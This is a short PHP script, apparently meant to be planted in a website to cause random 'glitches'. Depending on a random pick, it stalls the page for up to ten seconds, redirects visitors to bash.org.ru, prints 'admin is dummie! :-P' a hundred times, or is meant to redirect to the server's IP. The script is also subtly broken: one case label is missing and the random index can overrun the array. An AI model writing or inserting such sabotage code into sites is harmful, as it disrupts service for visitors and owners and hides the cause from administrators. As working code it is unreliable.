<?
if (!empty($_GET)){
	$_VALS=array_flip($_GET);
	$getvars=$getvars.'?';
	$c=0;
	foreach ($_GET as $_VAR){
		$getvars=$getvars.$_VALS[$_VAR].'='.$_VAR;
		$c++;
		if ($c<=(sizeof($_GET)-1))
			$getvars=$getvars.'&';
	}
}
$glucks=array(
				'sleep',
				'replace',
				'write',
				'replacetoip'
				);
if(date('d')%2>0)
	$rand=rand(0, intval(sizeof($glucks))*2);
else
	$rand=rand(intval(sizeof($glucks))/2, intval(sizeof($glucks))*2);
switch ($glucks[$rand]) {
	case 'sleep':
		sleep(rand(1, 10));
		break;
	case 'replace':
		header('location: http://bash.org.ru');
		break;
	case 'write':
		for ($i=0; $i<=100; $i++)
			echo 'admin is dummie! :-P ';
		break;
		header('location: '.gethostbyname($_SERVER['HTTP_HOST']).$getvars);
		break;
	default:
		break;
}
?>